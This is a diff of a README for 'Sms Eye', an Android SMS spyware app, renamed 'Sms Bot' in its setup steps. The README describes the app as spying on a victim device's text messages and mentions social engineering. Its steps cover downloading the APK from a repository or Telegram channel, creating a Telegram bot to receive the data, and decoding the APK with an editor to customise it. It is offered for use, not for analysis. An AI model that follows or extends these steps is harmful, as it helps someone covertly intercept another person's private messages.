@@ -12,8 +12,8 @@ Sms Eye is a software for spying on Android SMS, every time the victim device re
 - social engineering
 
 ## Setup
-#### 1 - Download Sms Eye APK
-Download Sms Eye APK file, you can download file from this repository or download it from our [Telegram channel](https://t.me/AbyssalArmy).
+#### 1 - Download Sms Bot APK
+Download Sms Bot APK file, you can download file from this repository or download it from our [Telegram channel](https://t.me/AbyssalArmy).
 #### 2 - Downlaod Apk Editor
 Download the APK Editor to customize the Sms Eye application, you can download Apk Editor from our [Telegram channel](https://t.me/AbyssalArmy).
 #### 3 - Create Telegram bot
@@ -25,8 +25,8 @@ start bot Father and send /newbot, choose name and username for your bot. after 
   <img src="/Preview/Frame 2.png" width="20%" />
 </p>
 
-#### 4 - Modify Sms Eye application
-open Apk Editor and select "APK file", then head to path Then go to the path where you saved the Sms Eye Apk file and select Sms Eye Apk file, select full edit then Decode all files.
+#### 4 - Modify Sms Bot application
+open Apk Editor and select "APK file", then head to path Then go to the path where you saved the Sms Bot Apk file and select Sms Bot Apk file, select full edit then Decode all files.
 <p float="left">
   <img src="/Preview/Frame 3.png" width="20%" />
   <img src="/Preview/Frame 4.png" width="20%" />
